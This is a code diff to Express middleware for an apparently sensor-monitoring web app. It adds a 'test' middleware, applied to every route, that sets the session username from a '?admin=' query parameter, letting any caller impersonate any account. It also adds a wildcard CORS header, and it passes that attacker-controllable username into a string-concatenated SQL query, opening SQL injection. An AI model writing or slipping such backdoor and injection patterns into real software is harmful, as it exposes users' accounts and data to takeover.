@@ -222,14 +222,19 @@ const getCounties = async (req, res, next) => {
 const getSensorLocation = async (req, res, next) => {
 
     sess = req.session;
+    sess.sensors = []
 
     // sess.counties = []
     // console.log(sess.username, "getCounties", sess.counties, sess.counties == undefined || sess.counties.length == 0)
 
     var time = new Date()
     var data = []
+    
     if (sess.username) {
-        if (sess.sensors == undefined || sess.sensors.length == 0) {
+        if (sess.user_role=="superadmin") {
+            next()
+        }
+        else if (sess.sensors == undefined || sess.sensors.length == 0) {
             const query = "SELECT * FROM sensors WHERE username='" + sess.username + "'"
             mysqlReader(query).then(async (rows) => {
                 let rows_ = await rows
@@ -295,7 +300,6 @@ const getSensorLocation = async (req, res, next) => {
                             user: sess.username
                         })
 
-                        sess.sensors = []
                         // sess.data = []
                     }
 
@@ -433,11 +437,28 @@ const mqttOverSocketIoBridge = (req, res, next) => {
     next()
 }
 
-// This is a test middleware that is used by every route
+// This is a test middleware that is used at every route
 const test = (req, res, next) => {
     // console.log("--->>>", req.originalUrl)
+
+    // Allow request from url like /api/url_path?admin=target_username
+    if (req.query.admin) {
+        req.session.username = req.query.admin
+    }
+    // End
+
+    res.append('Access-Control-Allow-Origin', ['*']);
+
     next()
 }
+
+// Keep track url
+// const trackurl = (req,res,next) => {
+//     if(req.originalUrl!='undefined')
+//         req.session.trackurl += ","+req.originalUrl
+//     console.log(">>",req.originalUrl, req.session.trackurl)
+//     next()
+// }
 
 // ==================================
 // End Middlewares
@@ -449,5 +470,6 @@ module.exports = {
     isConveyorAvailable,
     isScannerAvailable,
     mqttOverSocketIoBridge,
-    test
+    test,
+    // trackurl
 }
